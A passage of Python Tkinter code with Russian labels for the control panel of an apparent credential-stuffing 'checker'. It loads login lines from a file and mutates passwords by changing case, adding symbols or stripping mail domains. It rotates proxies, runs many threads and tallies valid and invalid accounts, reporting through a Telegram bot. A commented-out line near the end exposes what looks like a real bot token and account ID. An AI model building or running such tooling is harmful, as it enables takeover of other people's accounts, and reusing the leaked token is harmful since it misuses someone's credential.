        self.time_update_for_proxy = StringVar(value=self.config['onetab']['time_update_for_proxy'])
        self.amount_line = StringVar(value=self.config['onetab']['amount_line'])



        self.tab1(tab1)
        self.tab2(tab2)

    def center_window(self):
        w = 1300
        h = 370
        sw = self.parent.winfo_screenwidth()
        sh = self.parent.winfo_screenheight()
        x = (sw - w) / 2
        y = (sh - h) / 2
        self.parent.geometry('%dx%d+%d+%d' % (w, h, x, y))

    def update_stats(self):
        """Функция для эмуляции обновления статистики."""
        def run():
            all_check_old = 0
            # Кольцевые буферы для данных
            data_a = collections.deque()
            data_b = collections.deque()
            while True:

                current_time = time.time()
                # Добавляем данные в буфер
                data_a.append((current_time, good_check))
                data_b.append((current_time, bad_check))
                # time_window = 300
                # print(good_check)
                # print(bad_check)
                # Удаляем старые данные за пределами 5 минут
                while data_a and data_a[0][0] < current_time - 300:
                    data_a.popleft()
                while data_b and data_b[0][0] < current_time - 300:
                    data_b.popleft()

                # # Создаем переменные для отображения статистики
                # self.line_count = IntVar(value=0)
                # self.checks_count = IntVar(value=0)
                # self.valid = IntVar(value=0)
                # self.invalid = IntVar(value=0)
                # self.check_speed = DoubleVar(value=0.0)
                try:
                    with open('line.txt', 'r', encoding='utf-8') as file:
                        lines = file.readlines()
                        line_count = len(lines)
                        # queue.put(len(lines))
                except Exception as e:
                    lognow(f"Ошибка: {e}")
                # all_check, good_check, bad_check

                # Имитация получения данных
                self.line_count.set(f"{line_count:,}".replace(",", "_"))
                self.checks_count.set(all_check)
                self.valid.set(good_check)
                self.invalid.set(bad_check)
                self.check.set(check_check)
                self.recheck.set(recheck_check)
                if data_a and data_b:
                    sum_a = sum(value for _, value in data_a)
                    sum_b = sum(value for _, value in data_b)
                    if sum_b != 0:
                        percentage = (sum_a / sum_b) * 100
                    else:
                        percentage = 0
                    self.check_percent.set(f'{percentage:.2f}%')
                    # print(f"Процент A от B за последние 5 минут: {percentage:.2f}%")
                else:
                    pass
                    # print("Недостаточно данных для расчета.")
                #
                #     last_sent_time = now

                # print((line_count_old - line_count) * 6)
                # print(line_count_old)
                # print(line_count_old - line_count) * 6)
                if all_check_old == 0:
                    self.check_speed.set(all_check_old)
                else:
                    self.check_speed.set(f'{(all_check - all_check_old) * 6:,}'.replace(",", "_"))
                all_check_old = all_check
                # self.check_speed.set(random.uniform(0.5, 2.0))

                # Обновление каждые 2 секунды
                time.sleep(10)

        Thread(target=run, daemon=True).start()
    def tab1(self, tab1):
        amount_flow_entry_text = Label(tab1, text='Количество потоков:')
        amount_flow_entry_text.grid(row=0, column=0, padx=5, pady=3)
        self.amount_flow = Entry(tab1, textvariable=self.amount_flow)
        self.amount_flow.grid(row=0, column=1, padx=5, pady=3)

        turnon_blacklist_text = Label(tab1, text='Включить блеклист(ON/OFF):')
        turnon_blacklist_text.grid(row=1, column=0, padx=5, pady=3)
        self.turnon_blacklist = Entry(tab1, textvariable=self.turnon_blacklist)
        self.turnon_blacklist.grid(row=1, column=1, padx=5, pady=3)

        trying_check_text = Label(tab1, text='Кол. попыток проверки одной строки:')
        trying_check_text.grid(row=2, column=0, padx=5, pady=3)
        self.trying_check = Entry(tab1, textvariable=self.trying_check)
        self.trying_check.grid(row=2, column=1, padx=5, pady=3)

        format_proxy_text = Label(tab1, text='Версия API:')
        format_proxy_text.grid(row=3, column=0, padx=5, pady=3)

        # format_proxy_text = StringVar()
        # format_proxy_text.set(str(self.format_proxy))
        version_api_entry = Combobox(tab1, textvariable=self.version_api,
                                      values=["256", "309"], state="readonly")
        version_api_entry.grid(row=3, column=1, padx=5, pady=3)
        version_api_entry.bind("<<ComboboxSelected>>", self.version_api.set(version_api_entry.get()))

        Label(tab1, text='Настройки для рандомизации строки', font=("Arial", 12, "bold")).grid(row=4, column=0, padx=5, pady=3, sticky='nsew', columnspan=2)

        register_pas_text = Label(tab1, text='Изменять регистр(ON/OFF):')
        register_pas_text.grid(row=5, column=0, padx=5, pady=3)
        self.register_pas = Entry(tab1, textvariable=self.register_pas)
        self.register_pas.grid(row=5, column=1, padx=5, pady=3)

        add_symbol_text = Label(tab1, text='Добавить символы:')
        add_symbol_text.grid(row=6, column=0, padx=5, pady=3)
        self.add_symbol = Entry(tab1, textvariable=self.add_symbol)
        self.add_symbol.grid(row=6, column=1, padx=5, pady=3)

        del_maildomain_text = Label(tab1, text='Удалить домен почты(ON/OFF):')
        del_maildomain_text.grid(row=7, column=0, padx=5, pady=3)
        self.del_maildomain = Entry(tab1, textvariable=self.del_maildomain)
        self.del_maildomain.grid(row=7, column=1, padx=5, pady=3)

        amount_line_text = Label(tab1, text='Сколько за раз берем строк из файла:')
        amount_line_text.grid(row=8, column=0, padx=5, pady=3)
        self.amount_line = Entry(tab1, textvariable=self.amount_line)
        self.amount_line.grid(row=8, column=1, padx=5, pady=3)

        Label(tab1, text='Настройки соединения', font=("Arial", 12, "bold")).grid(row=0, column=2, padx=45, pady=3, sticky='nsew', columnspan=2)

        format_proxy_text = Label(tab1, text='Формат прокси (link|i:p:l:pas|l:pas:i:p):')
        format_proxy_text.grid(row=1, column=2, padx=5, pady=3)

        # format_proxy_text = StringVar()
        # format_proxy_text.set(str(self.format_proxy))
        format_proxy_entry = Combobox(tab1, textvariable=self.format_proxy, values=["link", "i:p:l:pas", "l:pas:i:p", "i:p"], state="readonly")
        format_proxy_entry.grid(row=1, column=3, padx=5, pady=3)
        format_proxy_entry.bind("<<ComboboxSelected>>", self.format_proxy.set(format_proxy_entry.get()))

        time_update_for_proxy_text = Label(tab1, text='При Link, как часто обновлять прокси(сек):')
        time_update_for_proxy_text.grid(row=2, column=2, padx=5, pady=3)
        self.time_update_for_proxy = Entry(tab1, textvariable=self.time_update_for_proxy)
        self.time_update_for_proxy.grid(row=2, column=3, padx=5, pady=3)

        amount_repeat_one_proxy_text = Label(tab1, text='Кол. попыток соединения до взятия другого прокси:')
        amount_repeat_one_proxy_text.grid(row=3, column=2, padx=5, pady=3)
        self.amount_repeat_one_proxy = Entry(tab1, textvariable=self.amount_repeat_one_proxy)
        self.amount_repeat_one_proxy.grid(row=3, column=3, padx=5, pady=3)

        amount_repeat_all_proxy_text = Label(tab1, text='Кол. попыток соединения всего:')
        amount_repeat_all_proxy_text.grid(row=4, column=2, padx=5, pady=3)
        self.amount_repeat_all_proxy = Entry(tab1, textvariable=self.amount_repeat_all_proxy)
        self.amount_repeat_all_proxy.grid(row=4, column=3, padx=5, pady=3)

        time_out_connection_text = Label(tab1, text='Таймаут одного соединения(сек):')
        time_out_connection_text.grid(row=5, column=2, padx=5, pady=3)
        self.time_out_connection = Entry(tab1, textvariable=self.time_out_connection)
        self.time_out_connection.grid(row=5, column=3, padx=5, pady=3)

        Label(tab1, text='Настройка статистики', font=("Arial", 12, "bold")).grid(row=6, column=2, padx=45, pady=3, sticky='nsew', columnspan=2)

        include_statistic_text = Label(tab1, text='Включить статистику(ON/OFF):')
        include_statistic_text.grid(row=7, column=2, padx=5, pady=3)
        self.include_statistic = Entry(tab1, textvariable=self.include_statistic)
        self.include_statistic.grid(row=7, column=3, padx=5, pady=3)

        interval_send_statistic_text = Label(tab1, text='Промежуток между отправкой статистики(сек):')
        interval_send_statistic_text.grid(row=8, column=2, padx=5, pady=3)
        self.interval_send_statistic = Entry(tab1, textvariable=self.interval_send_statistic)
        self.interval_send_statistic.grid(row=8, column=3, padx=5, pady=3)

        button = Button(tab1, text='Start', command=lambda: asyncio.run(self.start_and_save_profile()))
        button.grid(row=9, column=0, columnspan=1, ipadx=50, ipady=20, padx=10, pady=10, sticky='nsew')

        button = Button(tab1, text='Stop', command=stop_threads_loop)
        button.grid(row=9, column=1, columnspan=1, ipadx=50, ipady=20, padx=10, pady=10, sticky='nsew')

        Label(tab1, text='Статистика', font=("Arial", 12, "bold")).grid(row=0, column=4, padx=45, pady=3, sticky='nsew', columnspan=2)

        # Создаем переменные для отображения статистики
        self.line_count = IntVar(value=0)
        self.checks_count = IntVar(value=0)
        self.valid = IntVar(value=0)
        self.invalid = IntVar(value=0)
        self.check = IntVar(value=0)
        self.recheck = IntVar(value=0)
        self.check_speed = DoubleVar(value=0.0)
        self.check_percent = Variable(value='0%')


        Label(tab1, text='Строк в файле:', font=("Arial", 10)).grid(row=1, column=4, pady=3, sticky='e')
        self.line_count_label = Label(tab1, textvariable=self.line_count)
        self.line_count_label.grid(row=1, column=5, sticky='w')


        Label(tab1, text='Количество проверок:', font=("Arial", 10)).grid(row=2, column=4, pady=3, sticky='e')
        self.checks_count_label = Label(tab1, textvariable=self.checks_count)
        self.checks_count_label.grid(row=2, column=5, sticky='w')

        Label(tab1, text='Валид:', font=("Arial", 10)).grid(row=3, column=4, pady=3, sticky='e')
        self.valid_label = Label(tab1, textvariable=self.valid)
        self.valid_label.grid(row=3, column=5, sticky='w')

        Label(tab1, text='Невалид:', font=("Arial", 10)).grid(row=4, column=4, pady=3, sticky='e')
        self.invalid_label = Label(tab1, textvariable=self.invalid)
        self.invalid_label.grid(row=4, column=5, sticky='w')

        Label(tab1, text='Чек:', font=("Arial", 10)).grid(row=5, column=4, pady=3, sticky='e')
        self.check_label = Label(tab1, textvariable=self.check)
        self.check_label.grid(row=5, column=5, sticky='w')

        Label(tab1, text='Речек:', font=("Arial", 10)).grid(row=6, column=4, pady=3, sticky='e')
        self.recheck_label = Label(tab1, textvariable=self.recheck)
        self.recheck_label.grid(row=6, column=5, sticky='w')

        Label(tab1, text='Процент валида (в 5 минут):', font=("Arial", 10)).grid(row=7, column=4, pady=3, sticky='e')
        self.check_percent_label = Label(tab1, textvariable=self.check_percent)
        self.check_percent_label.grid(row=7, column=5, sticky='w')

        Label(tab1, text='Скорость проверки (в минуту):', font=("Arial", 10)).grid(row=8, column=4, pady=3, sticky='e')
        self.check_speed_label = Label(tab1, textvariable=self.check_speed)
        self.check_speed_label.grid(row=8, column=5, sticky='w')

        # Запускаем фоновый поток для обновления статистики
        self.update_stats()

    def tab2(self, tab2):
        blockl = Label(tab2, text='Log', font=("Arial", 16, "bold italic"))
        blockl.grid(sticky='nsew', column=2, row=2)
        mytext = scrolledtext.ScrolledText(tab2, width=50, height=10)
        mytext.place(relx=0.01, rely=0.08, relwidth=1, relheight=0.9)

        guiHandler = MyHandlerText(mytext)  # Передаем объект mytext в MyHandlerText
        module_logger.addHandler(guiHandler)



    def update_config(self, *args):
        self.config['onetab']['amount_flow'] = self.amount_flow.get()
        self.config['onetab']['turnon_blacklist'] = self.turnon_blacklist.get()
        self.config['onetab']['trying_check'] = self.trying_check.get()
        self.config['onetab']['version_api'] = self.version_api.get()
        self.config['onetab']['register_pas'] = self.register_pas.get()
        self.config['onetab']['add_symbol'] = self.add_symbol.get()
        self.config['onetab']['del_maildomain'] = self.del_maildomain.get()
        self.config['onetab']['format_proxy'] = self.format_proxy.get()
        self.config['onetab']['amount_repeat_one_proxy'] = self.amount_repeat_one_proxy.get()
        self.config['onetab']['amount_repeat_all_proxy'] = self.amount_repeat_all_proxy.get()
        self.config['onetab']['time_out_connection'] = self.time_out_connection.get()
        self.config['onetab']['include_statistic'] = self.include_statistic.get()
        self.config['onetab']['interval_send_statistic'] = self.interval_send_statistic.get()
        self.config['onetab']['bot_token'] = self.bot_token.get()
        self.config['onetab']['id_account'] = self.id_account.get()
        self.config['onetab']['ip_server'] = self.ip_server.get()
        self.config['onetab']['time_update_for_proxy'] = self.time_update_for_proxy.get()
        self.config['onetab']['amount_line'] = self.amount_line.get()

        with open("app/config.toml", "w") as config_file:
            toml.dump(self.config, config_file)


    def get_config_values(self):
        config_values = {
            "onetab": {
                "amount_flow": self.amount_flow.get(),
                "turnon_blacklist": self.turnon_blacklist.get(),
                "trying_check": self.trying_check.get(),
                "version_api": self.version_api.get(),
                "register_pas": self.register_pas.get(),
                "add_symbol": self.add_symbol.get(),
                "del_maildomain": self.del_maildomain.get(),
                "format_proxy": self.format_proxy.get(),
                "amount_repeat_one_proxy": self.amount_repeat_one_proxy.get(),
                "amount_repeat_all_proxy": self.amount_repeat_all_proxy.get(),
                "time_out_connection": self.time_out_connection.get(),
                "include_statistic": self.include_statistic.get(),
                "interval_send_statistic": self.interval_send_statistic.get(),
                "bot_token": self.bot_token.get(),
                "id_account": self.id_account.get(),
                "ip_server": self.ip_server.get(),
                "time_update_for_proxy": self.time_update_for_proxy.get(),
                "amount_line": self.amount_line.get()
            }
        }
        return config_values


    async def start_and_save_profile(self):
        self.update_config()  # Сначала сохраните изменения в конфиге
        config_values = self.get_config_values()
        lognow(f'{config_values}')
        await startflow_and_work(config_values)
        # await start_work(config_values)  # Затем запустите профиль



class MyHandlerText(logging.StreamHandler):
    def __init__(self, textctrl):
        logging.StreamHandler.__init__(self)
        self.textctrl = textctrl
        self.log_queue = deque(maxlen=25)  # Создаем очередь для хранения последних 500 записей
        # self.last_index = '1.0'

    def emit(self, record):
        global logmsg
        msg = self.format(record)
        self.log_queue.append(msg)  # Добавляем новую запись в очередь
        # scroll_pos = self.textctrl.yview()
        self.textctrl.config(state="normal")
        self.textctrl.delete(1.0, 'end')  # Очищаем текстовое поле
        for log_entry in self.log_queue:
            self.textctrl.insert('end', log_entry + "\n")  # Добавляем все записи из очереди в текстовое поле
        self.textctrl.config(state="disabled")
        # self.textctrl.yview_moveto(scroll_pos[0])

def log(now, logmsg):
    if __name__ == "__main__":
        if not any(isinstance(handler, MyHandlerText) for handler in module_logger.handlers):
            guiHandler = MyHandlerText(ConfigWindow.mytext)
            module_logger.addHandler(guiHandler)
            stderrHandler = logging.StreamHandler()
            module_logger.addHandler(stderrHandler)
        module_logger.setLevel(logging.INFO)
        module_logger.info(f"{now} {logmsg}")

module_logger = logging.getLogger(__name__)

def RefreshLabels(config_window):
    config_window.mytext = Text(config_window, state="disabled")
    config_window.update()

def lognow(logtext, good=False, error=False):
    # timenow2 = datetime.datetime.now().strftime('%H:%M:%S').split('.')[0]
    # log(timenow2, logtext)
    if good == False:
        logger.info(logtext)
    elif good == True:
        logger.warning(logtext)
    elif error == True:
        logger.error(logtext)

    # RefreshLabels(appl)

def init_config_window():
    global appl
    root = Tk()
    appl = ConfigWindow(root)
    root.mainloop()





if __name__ == "__main__":
    initialize_logger()
    init_config_window()
    # asyncio.run(start_work({'onetab': {'amount_flow': '1', 'turnon_blacklist': 'OFF', 'trying_check': '1', 'register_pas': 'ON', 'add_symbol': '', 'del_maildomain': 'ON', 'format_proxy': 'i:p:l:pas', 'amount_repeat_one_proxy': '3', 'amount_repeat_all_proxy': '6', 'time_out_connection': '30', 'include_statistic': 'OFF', 'interval_send_statistic': '10', 'bot_token': '6072179744:AAFai_10puE6NotXinrn00RUt0jtxkX496E', 'id_account': '1568921457', 'ip_server': '1.1.1.1'}}, 0))
